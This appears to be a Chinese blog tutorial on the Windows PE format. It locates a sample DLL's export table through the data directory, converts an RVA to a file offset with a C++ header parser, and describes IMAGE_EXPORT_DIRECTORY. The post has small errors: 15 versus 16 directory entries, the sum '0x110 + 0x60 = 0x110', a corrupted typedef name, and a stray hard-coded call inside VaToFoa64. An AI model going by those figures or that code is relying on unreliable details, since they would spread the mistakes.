<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211014165215769.png" alt="image-20211014165215769"></p>
<p>根据c语言中，该成员在扩展PE头中的定义</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br></pre></td></tr></table></figure>

<p>可以看到数组成员的结构为IMAGE_DATA_DIRECTORY</p>
<p><strong>IMAGE_DATA_DIRECTORY</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   Size;</span><br><span class="line">&#125; IMAGE_DATA_DIRECTORYAddressOfFunctions</span><br></pre></td></tr></table></figure>

<p>这样的结构于扩展PE头内有15个</p>
<table>
<thead>
<tr>
<th>IMAGE_DATA_DIRECTORY成员</th>
<th>数据宽度</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>VirtualAddress</td>
<td>DWORD(4字节)</td>
<td>表的起始位置（RVA）</td>
</tr>
<tr>
<td>Size</td>
<td>DWORD(4字节)</td>
<td>表的大小</td>
</tr>
</tbody></table>
<p>VirtualAddress 意为一个相对虚拟地址(RVA)</p>
<p>Size： 表的大小</p>
<p>根据VirtualAddress 与 Size 可求出该表的范围。</p>
<p>同时，IMAGE_DATA_DIRECTORY<strong>仅仅记录表的位置和大小，没有描述表的具体结构</strong></p>
<h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><p>1.找到IMAGE_OPTIONAL_HEADER32的最后一个成员DataDirectory</p>
<p>2.获取DataDirectory[0]</p>
<p>3.根据DataDirectory[0].virtualAddress得到导出表的RVA</p>
<p>4.将导出表的RVA转换为FOA，利用16进制编辑器定位导出表</p>
<p>RVA = 区块.VirtualAddress + 差值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">### RVA 转 FOA 计算方式</span><br><span class="line"></span><br><span class="line">若RVA不在PE头内:</span><br><span class="line"></span><br><span class="line">差值 = RVA - 区块.VirtualAddress</span><br><span class="line"></span><br><span class="line">FOA = 区块.PointerToRawData + 差值</span><br><span class="line"></span><br><span class="line">若在PE头内:</span><br><span class="line"></span><br><span class="line">RVA = FOA</span><br></pre></td></tr></table></figure>

<p><strong>分析实例</strong></p>
<p>以lyl610abc师傅于文中公布的dll文件为例，进行调试</p>
<p>导出函数的声明定义</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">EXPORTS</span><br><span class="line">Add @<span class="number">12</span> </span><br><span class="line">Sub @<span class="number">15</span> NONAME</span><br><span class="line">Multiply @<span class="number">17</span></span><br><span class="line">Divide @<span class="number">10</span></span><br></pre></td></tr></table></figure>

<p>具体导出函数定义</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> _stdcall <span class="title">Add</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x+y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> _stdcall <span class="title">Sub</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x-y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> _stdcall <span class="title">Multiply</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x * y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> _stdcall <span class="title">Divide</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x / y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="找到DataDirectory"><a href="#找到DataDirectory" class="headerlink" title="找到DataDirectory"></a>找到DataDirectory</h4><p>由于DataDirectory数据目录本身在PE头的扩展头部分，因此我们需要先获取到PE头的起始位，再根据IMAGE_NT_HEADERS结构的PE文件头标志大小+标准PE头大小达到扩展PE头：</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211014191938589.png" alt="image-20211014191938589"></p>
<p>演示DLL文件为PE32文件，因此PE格式的标准头文件为 IMAGE_NT_HEADERS：</p>
<p>扩展PE头首地址:0xF8+0x4+0x14(20) = 0x110</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211014192704811.png" alt="image-20211014192704811"></p>
<p>同时扩展PE头大小为224 字节，数据目录(DATADirectory大小) = _IMAGE_DATA_DIRECTORY大小*16 = 8 *16 = 128</p>
<p>因此224 - 128 = 96个字节</p>
<p>因此扩展PE头起始地址+ 96字节后为DataDirectory结构的起始地址</p>
<p>DataDirectory起始地址 = 扩展头地址+ 0x60(96) = 0x110 + 0x60 = 0x110 </p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211014195234440.png" alt="image-20211014195234440"></p>
<p>由此拿到DataDirectory，顺序排放DataDirectory[0] ~ DataDirectory[15] 8字节一张表</p>
<p>DataDirectory[0] 对应着导出表</p>
<table>
<thead>
<tr>
<th>IMAGE_DATA_DIRECTORY成员</th>
<th>值</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>VirtualAddress</td>
<td>0x00018FB0</td>
<td>表的起始位置（RVA）</td>
</tr>
<tr>
<td>Size</td>
<td>0x00000190</td>
<td>表的大小</td>
</tr>
</tbody></table>
<h4 id="得到导出表的RVA"><a href="#得到导出表的RVA" class="headerlink" title="得到导出表的RVA"></a>得到导出表的RVA</h4><p>根据结构拿到导出表<strong>RVA</strong>值为: 0x018FB0</p>
<p>导出表的<strong>size</strong>为: 0x0190</p>
<h4 id="RVA转换FOA"><a href="#RVA转换FOA" class="headerlink" title="RVA转换FOA"></a><strong>RVA转换FOA</strong></h4><p>但是IMAGE_DATA_DIRECTORY中的VirtualAddress 是RVA它在内存中才有的用， 在磁盘文件下需要将其转换成FOA</p>
<p>直接利用代码获取对应的FOA:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// PE.cpp : Defines the entry point for the console application.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winnt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="comment">//在VC6这个比较旧的环境里，没有定义64位的这个宏，需要自己定义，在VS2019中无需自己定义</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_AMD64  0x8664</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//VA转FOA 32位</span></span><br><span class="line"><span class="comment">//第一个参数为要转换的在内存中的地址：VA</span></span><br><span class="line"><span class="comment">//第二个参数为指向dos头的指针</span></span><br><span class="line"><span class="comment">//第三个参数为指向nt头的指针</span></span><br><span class="line"><span class="comment">//第四个参数为存储指向节指针的数组</span></span><br><span class="line"><span class="function">UINT <span class="title">VaToFoa32</span><span class="params">(UINT va, _IMAGE_DOS_HEADER *dos,_IMAGE_NT_HEADERS* nt, _IMAGE_SECTION_HEADER** sectionArr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//得到RVA的值：RVA = VA - ImageBase</span></span><br><span class="line">    UINT rva = va - nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">    <span class="comment">//输出rva</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rva:%X\n&quot;</span>, rva);</span><br><span class="line">    <span class="comment">//找到PE文件头后的地址 = PE文件头首地址+PE文件头大小</span></span><br><span class="line">    UINT PeEnd = (UINT)dos-&gt;e_lfanew+<span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS);</span><br><span class="line">    <span class="comment">//输出PeEnd</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PeEnd:%X\n&quot;</span>, PeEnd);</span><br><span class="line">    <span class="comment">//判断rva是否位于PE文件头中</span></span><br><span class="line">    <span class="keyword">if</span> (rva &lt; PeEnd) &#123;</span><br><span class="line">        <span class="comment">//如果rva位于PE文件头中，则foa==rva，直接返回rva即可</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, rva);        </span><br><span class="line">        <span class="keyword">return</span> rva;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//如果rva在PE文件头外</span></span><br><span class="line">        <span class="comment">//判断rva属于哪个节</span></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++) &#123;</span><br><span class="line">            <span class="comment">//计算内存对齐后节的大小</span></span><br><span class="line">            UINT SizeInMemory = <span class="built_in">ceil</span>((<span class="keyword">double</span>)<span class="built_in">max</span>((UINT)sectionArr[i]-&gt;Misc.VirtualSize ,(UINT)sectionArr[i]-&gt;SizeOfRawData ) / (<span class="keyword">double</span>)nt-&gt;OptionalHeader.SectionAlignment)* nt-&gt;OptionalHeader.SectionAlignment;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (rva &gt;= sectionArr[i]-&gt;VirtualAddress &amp;&amp; rva &lt; (sectionArr[i]-&gt;VirtualAddress + SizeInMemory)) &#123;</span><br><span class="line">                <span class="comment">//找到所属的节</span></span><br><span class="line">                <span class="comment">//输出内存对齐后的节的大小</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;SizeInMemory:%X\n&quot;</span>, SizeInMemory);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= nt-&gt;FileHeader.NumberOfSections) &#123;</span><br><span class="line">            <span class="comment">//未找到</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;没有找到匹配的节\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//计算差值= RVA - 节.VirtualAddress</span></span><br><span class="line">            UINT offset = rva - sectionArr[i]-&gt;VirtualAddress;</span><br><span class="line">            <span class="comment">//FOA = 节.PointerToRawData + 差值</span></span><br><span class="line">            UINT foa = sectionArr[i]-&gt;PointerToRawData + offset;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, foa);</span><br><span class="line">            <span class="keyword">return</span> foa;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//VA转FOA 64位</span></span><br><span class="line"><span class="comment">//第一个参数为要转换的在内存中的地址：VA</span></span><br><span class="line"><span class="comment">//第二个参数为指向dos头的指针</span></span><br><span class="line"><span class="comment">//第三个参数为指向nt头的指针</span></span><br><span class="line"><span class="comment">//第四个参数为存储指向节指针的数组</span></span><br><span class="line"><span class="function">UINT <span class="title">VaToFoa64</span><span class="params">(UINT va, _IMAGE_DOS_HEADER* dos, _IMAGE_NT_HEADERS64* nt, _IMAGE_SECTION_HEADER** sectionArr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//得到RVA的值：RVA = VA - ImageBase</span></span><br><span class="line">    UINT rva = va - nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">    <span class="comment">//输出rva</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rva:%X\n&quot;</span>, rva);</span><br><span class="line">    <span class="comment">//找到PE文件头后的地址 = PE文件头首地址+PE文件头大小</span></span><br><span class="line">    UINT PeEnd = (UINT)dos-&gt;e_lfanew + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS64);</span><br><span class="line">    <span class="comment">//输出PeEnd</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PeEnd:%X\n&quot;</span>, PeEnd);</span><br><span class="line">    <span class="comment">//判断rva是否位于PE文件头中</span></span><br><span class="line">    <span class="keyword">if</span> (rva &lt; PeEnd) &#123;</span><br><span class="line">        <span class="comment">//如果rva位于PE文件头中，则foa==rva，直接返回rva即可</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, rva);</span><br><span class="line">        <span class="keyword">return</span> rva;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//如果rva在PE文件头外</span></span><br><span class="line">        <span class="comment">//判断rva属于哪个节</span></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++) &#123;</span><br><span class="line">            <span class="comment">//计算内存对齐后节的大小</span></span><br><span class="line">            UINT SizeInMemory = <span class="built_in">ceil</span>((<span class="keyword">double</span>)<span class="built_in">max</span>((UINT)sectionArr[i]-&gt;Misc.VirtualSize ,(UINT)sectionArr[i]-&gt;SizeOfRawData ) / (<span class="keyword">double</span>)nt-&gt;OptionalHeader.SectionAlignment)* nt-&gt;OptionalHeader.SectionAlignment;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (rva &gt;= sectionArr[i]-&gt;VirtualAddress &amp;&amp; rva &lt; (sectionArr[i]-&gt;VirtualAddress + SizeInMemory)) &#123;</span><br><span class="line">                <span class="comment">//找到所属的节</span></span><br><span class="line">                <span class="comment">//输出内存对齐后的节的大小</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;SizeInMemory:%X\n&quot;</span>, SizeInMemory);</span><br><span class="line">				<span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase +<span class="number">0x18FB0</span>,dos,(_IMAGE_NT_HEADERS*)nt,sectionArr);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= nt-&gt;FileHeader.NumberOfSections) &#123;</span><br><span class="line">            <span class="comment">//未找到</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;没有找到匹配的节\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//计算差值= RVA - 节.VirtualAddress</span></span><br><span class="line">            <span class="keyword">int</span> offset = rva - sectionArr[i]-&gt;VirtualAddress;</span><br><span class="line">            <span class="comment">//FOA = 节.PointerToRawData + 差值</span></span><br><span class="line">            <span class="keyword">int</span> foa = sectionArr[i]-&gt;PointerToRawData + offset;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, foa);</span><br><span class="line">            <span class="keyword">return</span> foa;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//创建DOS对应的结构体指针</span></span><br><span class="line">    _IMAGE_DOS_HEADER* dos;</span><br><span class="line">    <span class="comment">//读取文件，返回文件句柄</span></span><br><span class="line">    HANDLE hFile = <span class="built_in">CreateFileA</span>(<span class="string">&quot;C:\\Users\\86156\\Desktop\\mydll.dll&quot;</span>, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//根据文件句柄创建映射</span></span><br><span class="line">    HANDLE hMap = <span class="built_in">CreateFileMappingA</span>(hFile, <span class="literal">NULL</span>, PAGE_READONLY, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//映射内容</span></span><br><span class="line">    LPVOID pFile = <span class="built_in">MapViewOfFile</span>(hMap, FILE_MAP_READ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//类型转换，用结构体的方式来读取</span></span><br><span class="line">    dos = (_IMAGE_DOS_HEADER*)pFile;</span><br><span class="line">    <span class="comment">//输出dos-&gt;e_magic，以十六进制输出</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;dos-&gt;e_magic:%X\n&quot;</span>, dos-&gt;e_magic);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建指向PE文件头标志的指针</span></span><br><span class="line">    DWORD* peId;</span><br><span class="line">    <span class="comment">//让PE文件头标志指针指向其对应的地址=DOS首地址+偏移</span></span><br><span class="line">    peId = (DWORD*)((UINT)dos + dos-&gt;e_lfanew);</span><br><span class="line">    <span class="comment">//输出PE文件头标志，其值应为4550，否则不是PE文件</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;peId:%X\n&quot;</span>, *peId);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建指向可选PE头的第一个成员magic的指针</span></span><br><span class="line">    WORD* magic;</span><br><span class="line">    <span class="comment">//让magic指针指向其对应的地址=PE文件头标志地址+PE文件头标志大小+标准PE头大小</span></span><br><span class="line">    magic = (WORD*)((UINT)peId + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD) + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_FILE_HEADER));</span><br><span class="line">    <span class="comment">//输出magic，其值为0x10b代表32位程序，其值为0x20b代表64位程序</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;magic:%X\n&quot;</span>, *magic);</span><br><span class="line">    <span class="comment">//根据magic判断为32位程序还是64位程序</span></span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (*magic) &#123;</span><br><span class="line">    <span class="keyword">case</span> IMAGE_NT_OPTIONAL_HDR32_MAGIC:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;32位程序\n&quot;</span>);</span><br><span class="line">        <span class="comment">//确定为32位程序后，就可以使用_IMAGE_NT_HEADERS来接收数据了</span></span><br><span class="line">        <span class="comment">//创建指向PE文件头的指针</span></span><br><span class="line">        _IMAGE_NT_HEADERS* nt;</span><br><span class="line">        <span class="comment">//让PE文件头指针指向其对应的地址</span></span><br><span class="line">        nt = (_IMAGE_NT_HEADERS*)peId;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Machine:%X\n&quot;</span>, nt-&gt;FileHeader.Machine);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Magic:%X\n&quot;</span>, nt-&gt;OptionalHeader.Magic);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个指针数组，该指针数组用来存储所有的节表指针</span></span><br><span class="line">        <span class="comment">//这里相当于_IMAGE_SECTION_HEADER* sectionArr[nt-&gt;FileHeader.NumberOfSections],声明了一个动态数组</span></span><br><span class="line">        _IMAGE_SECTION_HEADER** sectionArr = (_IMAGE_SECTION_HEADER**) <span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER*) * nt-&gt;FileHeader.NumberOfSections);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建指向块表的指针</span></span><br><span class="line">        _IMAGE_SECTION_HEADER* sectionHeader;</span><br><span class="line">        <span class="comment">//让块表的指针指向其对应的地址</span></span><br><span class="line">        sectionHeader = (_IMAGE_SECTION_HEADER*)((UINT)nt + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS));</span><br><span class="line">        <span class="comment">//计数，用来计算块表地址</span></span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//比较 计数 和 块表的个数，即遍历所有块表</span></span><br><span class="line">        <span class="keyword">while</span>(cnt&lt; nt-&gt;FileHeader.NumberOfSections)&#123;</span><br><span class="line">            <span class="comment">//创建指向块表的指针</span></span><br><span class="line">            _IMAGE_SECTION_HEADER* section;</span><br><span class="line">            <span class="comment">//让块表的指针指向其对应的地址=第一个块表地址+计数*块表的大小</span></span><br><span class="line">            section = (_IMAGE_SECTION_HEADER*)((UINT)sectionHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER)*cnt);</span><br><span class="line">            <span class="comment">//将得到的块表指针存入数组</span></span><br><span class="line">            sectionArr[cnt++] = section;</span><br><span class="line">            <span class="comment">//输出块表名称</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, section-&gt;Name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase +<span class="number">0x18FB0</span>,dos,(_IMAGE_NT_HEADERS*)nt,sectionArr);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> IMAGE_NT_OPTIONAL_HDR64_MAGIC:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;64位程序\n&quot;</span>);</span><br><span class="line">        <span class="comment">//确定为64位程序后，就可以使用_IMAGE_NT_HEADERS64来接收数据了</span></span><br><span class="line">        <span class="comment">//创建指向PE文件头的指针</span></span><br><span class="line">        _IMAGE_NT_HEADERS64* nt;</span><br><span class="line">        nt = (_IMAGE_NT_HEADERS64*)peId;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Machine:%X\n&quot;</span>, nt-&gt;FileHeader.Machine);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Magic:%X\n&quot;</span>, nt-&gt;OptionalHeader.Magic);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个指针数组，该指针数组用来存储所有的节表指针</span></span><br><span class="line">        <span class="comment">//这里相当于_IMAGE_SECTION_HEADER* sectionArr[nt-&gt;FileHeader.NumberOfSections],声明了一个动态数组</span></span><br><span class="line">        _IMAGE_SECTION_HEADER** sectionArr = (_IMAGE_SECTION_HEADER**)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER*) * nt-&gt;FileHeader.NumberOfSections);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建指向块表的指针</span></span><br><span class="line">        _IMAGE_SECTION_HEADER* sectionHeader;</span><br><span class="line">        <span class="comment">//让块表的指针指向其对应的地址，区别在于这里加上的偏移为_IMAGE_NT_HEADERS64</span></span><br><span class="line">        sectionHeader = (_IMAGE_SECTION_HEADER*)((UINT)nt + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS64));</span><br><span class="line">        <span class="comment">//计数，用来计算块表地址</span></span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//比较 计数 和 块表的个数，即遍历所有块表</span></span><br><span class="line">        <span class="keyword">while</span> (cnt &lt; nt-&gt;FileHeader.NumberOfSections) &#123;</span><br><span class="line">            <span class="comment">//创建指向块表的指针</span></span><br><span class="line">            _IMAGE_SECTION_HEADER* section;</span><br><span class="line">            <span class="comment">//让块表的指针指向其对应的地址=第一个块表地址+计数*块表的大小</span></span><br><span class="line">            section = (_IMAGE_SECTION_HEADER*)((UINT)sectionHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER) * cnt);</span><br><span class="line">            <span class="comment">//将得到的块表指针存入数组</span></span><br><span class="line">            sectionArr[cnt++] = section;</span><br><span class="line">            <span class="comment">//输出块表名称</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, section-&gt;Name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>关键代码</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase +<span class="number">0x18FB0</span>,dos,nt,sectionArr);</span><br></pre></td></tr></table></figure>

<p>由于之前的函数是VA转FOA，这边我们拿到的是RVA,因此想要正确利用，需要用到RVA + ImageBase得到VA</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211014201121563.png" alt="image-20211014201121563"></p>
<p>自此拿到FOA为:0x79B0</p>
<h2 id="导出表的结构"><a href="#导出表的结构" class="headerlink" title="导出表的结构"></a>导出表的结构</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>可以定位到导出表后下一步便是要了解导出表的结构，才能解读导出表的信息</p>
<p>C语言中的结构体(Winnt.h可以找到)，本结构在C语言中长40字节，导出表范围:导出表首地址(FOA)+导出表长度-1 (减1是由于导出表首地址也占一个字节)</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211014203245039.png" alt="image-20211014203245039"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   Base;</span><br><span class="line">    DWORD   NumberOfFunctions;</span><br><span class="line">    DWORD   NumberOfNames;</span><br><span class="line">    DWORD   AddressOfFunctions;     <span class="comment">// RVA from base of image</span></span><br><span class="line">    DWORD   AddressOfNames;         <span class="comment">// RVA from base of image</span></span><br><span class="line">    DWORD   AddressOfNameOrdinals;  <span class="comment">// RVA from base of image</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>结构体分析</strong></p>
<table>
<thead>
<tr>
<th>成员</th>
<th>数据宽度</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Characteristics</td>
<td>DWORD(4字节)</td>
<td>标志，未用</td>
</tr>
<tr>
<td>TimeDateStamp</td>
<td>DWORD(4字节)</td>
<td>时间戳</td>
</tr>
<tr>
<td>MajorVersion</td>
<td>WORD(2字节)</td>
<td>未用</td>
</tr>
<tr>
<td>MinorVersion</td>
<td>WORD(2字节)</td>
<td>未用</td>
</tr>
<tr>
<td>Name</td>
<td>DWORD(4字节)</td>
<td>指向该导出表的文件名字符串</td>
</tr>
<tr>
<td>Base</td>
<td>DWORD(4字节)</td>
<td>导出函数起始序号</td>
</tr>
<tr>
<td>NumberOfFunctions</td>
<td>DWORD(4字节)</td>
<td>所有导出函数的个数</td>
</tr>
<tr>
<td>NumberOfNames</td>
<td>DWORD(4字节)</td>
<td>以函数名字导出的函数个数</td>
</tr>
<tr>
<td>AddressOfFunctions</td>
<td>DWORD(4字节)</td>
<td>导出函数地址表RVA</td>
</tr>
<tr>
<td>AddressOfNames</td>
<td>DWORD(4字节)</td>
<td>导出函数名称表RVA</td>
</tr>
<tr>
<td>AddressOfNameOrdinals</td>
<td>DWORD(4字节)</td>
<td>导出函数序号表RVA</td>
</tr>
</tbody></table>
<p>解释几个比较重要的字段</p>
<h4 id="Name"><a href="#Name" class="headerlink" title="Name"></a>Name</h4><p>该字段指示的地址指向了一个以”\0”结尾的字符串，字符串记录了导出表所在文件的最初文件名，因此就算后期重命名此PE文件，也可在name处找到最初文件名</p>
